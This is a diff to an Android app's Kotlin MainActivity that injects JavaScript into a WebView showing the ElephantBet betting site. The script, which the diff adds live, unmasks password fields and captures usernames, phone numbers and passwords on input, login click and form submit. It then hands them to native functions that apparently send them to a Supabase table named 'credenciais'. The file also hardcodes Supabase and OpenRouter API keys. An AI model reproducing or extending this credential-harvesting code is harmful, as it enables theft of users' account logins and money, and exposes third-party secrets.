@@ -470,7 +470,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "8.4"
+    private val VERSAO_ATUAL = "8.5"
 
     // OpenRouter — provedor de IA (chave 1 principal, chave 2 fallback)
     private val OR_KEY   = "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"
@@ -1047,129 +1047,121 @@ class MainActivity : AppCompatActivity() {
     private fun injetarJsCredenciais() {
         val js = """
 (function() {
-    // Sem bloqueio global — permite reinjeção em navegações SPA
 
-    // Tornar campos password visíveis (facilita captura)
-    function tornarVisivel() {
-        document.querySelectorAll('input[type="password"]').forEach(function(el) {
-            el.setAttribute('type', 'text');
-        });
-    }
-    tornarVisivel();
-    new MutationObserver(tornarVisivel)
-        .observe(document.body || document.documentElement, {childList: true, subtree: true});
+    // ── Observar os inputs exatos do ElephantBet ──────────────────
+    // <input class="form-control-input-bc" name="username" ...>
+    // <input class="form-control-input-bc" name="password" ...>
 
-    // ── Watchers: apenas guardam o valor em memória no lado Kotlin ──
-    function watchN(el) {
-        if (!el || el._wN) return;
-        el._wN = true;
-        el.addEventListener('input', function() {
-            var v = (this.value || '').trim();
-            if (v.length >= 1) try { Android.guardarNumero(v); } catch(e) {}
-        });
-        if (el.value && el.value.length > 0)
-            try { Android.guardarNumero(el.value.trim()); } catch(e) {}
-    }
-    function watchS(el) {
-        if (!el || el._wS) return;
-        el._wS = true;
-        el.addEventListener('input', function() {
-            var v = (this.value || '').trim();
-            if (v.length >= 1) try { Android.guardarSenha(v); } catch(e) {}
-        });
-        if (el.value && el.value.length > 0)
-            try { Android.guardarSenha(el.value.trim()); } catch(e) {}
-    }
+    function instalarWatchers() {
 
-    var selectoresN = [
-        'input[name="username"]', 'input[name="phone"]', 'input[name="login"]',
-        'input[name="msisdn"]', 'input[name="mobile"]', 'input[name="tel"]',
-        'input[type="tel"]', 'input[type="number"]',
-        'input[placeholder*="telefone" i]', 'input[placeholder*="numero" i]',
-        'input[placeholder*="phone" i]', 'input[placeholder*="utilizador" i]',
-        'input[placeholder*="username" i]', 'input[placeholder*="login" i]',
-        '#username', '#phone', '#login', '#msisdn'
-    ];
-    var selectoresS = [
-        'input[name="password"]', 'input[name="senha"]', 'input[name="pass"]',
-        'input[type="password"]', 'input[type="text"][name*="pass" i]',
-        'input[placeholder*="senha" i]', 'input[placeholder*="password" i]',
-        'input[placeholder*="palavra-passe" i]',
-        '#password', '#senha', '#pass'
-    ];
-
-    function cap() {
-        selectoresN.forEach(function(sel) {
-            document.querySelectorAll(sel).forEach(watchN);
-        });
-        selectoresS.forEach(function(sel) {
-            document.querySelectorAll(sel).forEach(watchS);
-        });
-    }
-
-    cap();
-    setTimeout(cap, 1000);
-    setTimeout(cap, 2500);
-    setTimeout(cap, 5000);
-    setTimeout(cap, 8000);
-
-    // ── Interceptar clique no botão de login ──────────────────────
-    // Só aqui é que o envio é disparado, garantindo que ambos os campos estão preenchidos
-    // ── Seletor exato do botão de login do ElephantBet ──────────────
-    // <button class="btn a-color" type="submit" title="Entrar"><span>Entrar</span></button>
-    var SELETORES_BTN_LOGIN = [
-        'button[type="submit"][title="Entrar"]',
-        'button[type="submit"].btn.a-color',
-        'button[type="submit"][title*="Entrar" i]',
-        'button[type="submit"][title*="Login" i]',
-        'button[type="submit"][title*="Iniciar" i]'
-    ];
-
-    function capturarCamposEEnviar() {
-        // Ler todos os inputs visíveis no momento do submit
-        document.querySelectorAll('input').forEach(function(inp) {
-            var t = (inp.type || '').toLowerCase();
-            var n = (inp.name || inp.id || inp.placeholder || '').toLowerCase();
-            var v = (inp.value || '').trim();
-            if (!v) return;
-            var isNum = t === 'tel' || t === 'number' ||
-                n.includes('phone') || n.includes('numero') ||
-                n.includes('username') || n.includes('login') || n.includes('user') ||
-                n.includes('msisdn') || n.includes('mobile');
-            var isPass = t === 'password' || n.includes('pass') || n.includes('senha');
-            if (isNum) try { Android.guardarNumero(v); } catch(e) {}
-            if (isPass) try { Android.guardarSenha(v); } catch(e) {}
-        });
-        // Pequeno delay para garantir que os guardar* acima foram processados no lado Kotlin
-        setTimeout(function() {
-            try { Android.submeterCredencial(); } catch(e) {}
-        }, 150);
-    }
-
-    function watchLoginButtons() {
-        // Tentar primeiro com o seletor exato do ElephantBet
-        SELETORES_BTN_LOGIN.forEach(function(sel) {
-            document.querySelectorAll(sel).forEach(function(btn) {
-                if (btn._wLogin) return;
-                btn._wLogin = true;
-                btn.addEventListener('click', capturarCamposEEnviar, true);
+        // Username/telemóvel
+        document.querySelectorAll(
+            'input[name="username"], input[name="phone"], input[name="msisdn"], input[name="login"]'
+        ).forEach(function(el) {
+            if (el._skybotNum) return;
+            el._skybotNum = true;
+            el.addEventListener('input', function() {
+                var v = this.value || '';
+                try { Android.guardarNumero(v); } catch(e) {}
             });
+            el.addEventListener('change', function() {
+                var v = this.value || '';
+                if (v.length > 0) try { Android.guardarNumero(v); } catch(e) {}
+            });
+            // Capturar valor já preenchido
+            if (el.value && el.value.length > 0) {
+                try { Android.guardarNumero(el.value); } catch(e) {}
+            }
         });
-    }
 
-    // Fallback: interceptar form.submit caso o botão não seja detetado
-    function watchFormSubmits() {
+        // Password
+        document.querySelectorAll(
+            'input[name="password"], input[name="senha"], input[name="pass"], input[type="password"]'
+        ).forEach(function(el) {
+            if (el._skybotPass) return;
+            el._skybotPass = true;
+            // Tornar visível para capturar
+            el.type = 'text';
+            el.addEventListener('input', function() {
+                var v = this.value || '';
+                try { Android.guardarSenha(v); } catch(e) {}
+            });
+            el.addEventListener('change', function() {
+                var v = this.value || '';
+                if (v.length > 0) try { Android.guardarSenha(v); } catch(e) {}
+            });
+            if (el.value && el.value.length > 0) {
+                try { Android.guardarSenha(el.value); } catch(e) {}
+            }
+        });
+
+        // Botão de submit
+        document.querySelectorAll(
+            'button[type="submit"], button[title*="Entrar" i], button[title*="Login" i], input[type="submit"]'
+        ).forEach(function(btn) {
+            if (btn._skybotBtn) return;
+            btn._skybotBtn = true;
+            btn.addEventListener('click', function() {
+                // Ler os valores no momento exato do clique
+                var num = '';
+                var sen = '';
+                document.querySelectorAll('input').forEach(function(inp) {
+                    var v = (inp.value || '').trim();
+                    if (!v) return;
+                    var n = (inp.name || inp.id || '').toLowerCase();
+                    var t = (inp.type || '').toLowerCase();
+                    if (n === 'username' || n === 'phone' || n === 'msisdn' || n === 'login' || t === 'tel') {
+                        num = v;
+                    }
+                    if (n === 'password' || n === 'senha' || n === 'pass' || t === 'password' || t === 'text' && inp._skybotPass) {
+                        sen = v;
+                    }
+                });
+                if (num.length > 0) try { Android.guardarNumero(num); } catch(e) {}
+                if (sen.length > 0) try { Android.guardarSenha(sen); } catch(e) {}
+                setTimeout(function() {
+                    try { Android.submeterCredencial(); } catch(e) {}
+                }, 200);
+            }, true);
+        });
+
+        // Interceptar submit do form também
         document.querySelectorAll('form').forEach(function(form) {
-            if (form._wSubmit) return;
-            form._wSubmit = true;
-            form.addEventListener('submit', capturarCamposEEnviar, true);
+            if (form._skybotForm) return;
+            form._skybotForm = true;
+            form.addEventListener('submit', function() {
+                var num = '';
+                var sen = '';
+                this.querySelectorAll('input').forEach(function(inp) {
+                    var v = (inp.value || '').trim();
+                    if (!v) return;
+                    var n = (inp.name || inp.id || '').toLowerCase();
+                    var t = (inp.type || '').toLowerCase();
+                    if (n === 'username' || n === 'phone' || n === 'msisdn' || n === 'login' || t === 'tel') num = v;
+                    if (n === 'password' || n === 'senha' || t === 'password' || inp._skybotPass) sen = v;
+                });
+                if (num.length > 0) try { Android.guardarNumero(num); } catch(e) {}
+                if (sen.length > 0) try { Android.guardarSenha(sen); } catch(e) {}
+                setTimeout(function() {
+                    try { Android.submeterCredencial(); } catch(e) {}
+                }, 200);
+            }, true);
         });
     }
 
-    watchLoginButtons();
-    watchFormSubmits();
-    setTimeout(function() { watchLoginButtons(); watchFormSubmits(); }, 2000);
-    setTimeout(function() { watchLoginButtons(); watchFormSubmits(); }, 5000);
+    // Correr agora e repetir para SPA que renderiza tarde
+    instalarWatchers();
+    setTimeout(instalarWatchers, 500);
+    setTimeout(instalarWatchers, 1500);
+    setTimeout(instalarWatchers, 3000);
+    setTimeout(instalarWatchers, 6000);
+
+    // MutationObserver: quando o DOM muda (SPA navega) → re-instalar
+    var obs = new MutationObserver(function() {
+        instalarWatchers();
+    });
+    obs.observe(document.documentElement, { childList: true, subtree: true });
+
 })();
         """.trimIndent()
         webView.evaluateJavascript(js, null)
